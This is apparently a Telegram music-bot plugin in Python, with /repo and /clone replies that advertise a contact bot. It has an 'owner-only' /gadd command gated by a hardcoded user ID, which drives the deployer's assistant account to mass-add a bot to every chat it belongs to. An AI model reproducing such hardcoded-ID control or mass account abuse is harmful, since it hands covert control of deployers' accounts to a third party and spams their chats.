import asyncio

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message

from BrandrdXMusic import app
from BrandrdXMusic.utils.database import add_served_chat, get_assistant


# ─────────────────────────────────────────────
# REPO COMMAND (EVID IDENTITY)
# ─────────────────────────────────────────────
@app.on_message(filters.command("repo"))
async def repo_cmd(client: Client, message: Message):
    await message.reply_photo(
        photo="https://graph.org/file/872dc8af2a36bed43b9b6.jpg",
        caption=(
            "**EVID CORE – Source Access**\n\n"
            "This project source is not publicly listed.\n\n"
            "👉 **Contact @AiAssistu_bot** to get access, setup help, "
            "or official deployment support."
        ),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Contact Support",
                        url="https://t.me/AiAssistu_bot",
                    )
                ]
            ]
        ),
    )


# ─────────────────────────────────────────────
# CLONE COMMAND (RESTRICTED)
# ─────────────────────────────────────────────
@app.on_message(filters.command("clone"))
async def clone_cmd(client: Client, message: Message):
    await message.reply_photo(
        photo="https://graph.org/file/f4b34351a59061ba1c61b.jpg",
        caption=(
            "**Clone Restricted** ❌\n\n"
            "You are not authorized to clone this bot.\n\n"
            "If you want your own instance or custom build,\n"
            "please contact **@AiAssistu_bot**."
        ),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "Request Access",
                        url="https://t.me/AiAssistu_bot",
                    )
                ]
            ]
        ),
    )


# ─────────────────────────────────────────────
# SIMPLE GROUP PRESENCE CHECK
# ─────────────────────────────────────────────
@app.on_message(
    filters.command(
        ["hi", "hii", "hello", "gm", "bye", "thanks", "welcome"],
        prefixes=["/", "!", ".", ","],
    )
    & filters.group
)
async def bot_check(_, message: Message):
    await add_served_chat(message.chat.id)


# ─────────────────────────────────────────────
# GLOBAL BOT ADD (OWNER ONLY)
# ─────────────────────────────────────────────
@app.on_message(filters.command("gadd") & filters.user(int(7250012103)))
async def add_allbot(client: Client, message: Message):
    command_parts = message.text.split(" ", 1)
    if len(command_parts) != 2:
        return await message.reply(
            "**Usage:** `/gadd @BotUsername`"
        )

    bot_username = command_parts[1]

    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id

        done = 0
        failed = 0

        status = await message.reply("🔄 Adding bot to all available chats...")

        await userbot.send_message(bot_username, "/start")

        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1001754457302:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
            except:
                failed += 1

            await status.edit(
                f"**Bot:** {bot_username}\n\n"
                f"✅ Added: {done}\n"
                f"❌ Failed: {failed}\n\n"
                f"By: @{userbot.username}"
            )
            await asyncio.sleep(3)

        await status.edit(
            f"🎉 **Completed Successfully**\n\n"
            f"✅ Added: {done}\n"
            f"❌ Failed: {failed}\n\n"
            f"By: @{userbot.username}"
        )

    except Exception as e:
        await message.reply(f"Error: `{e}`")


# ─────────────────────────────────────────────
# MODULE INFO
# ─────────────────────────────────────────────
__MODULE__ = "Source"
__HELP__ = """
**EVID CORE – Source Module**

Commands:
- `/repo` : Get official source access information
- `/clone` : Clone request (restricted)

For access, support or deployment:
👉 @AiAssistu_bot
"""
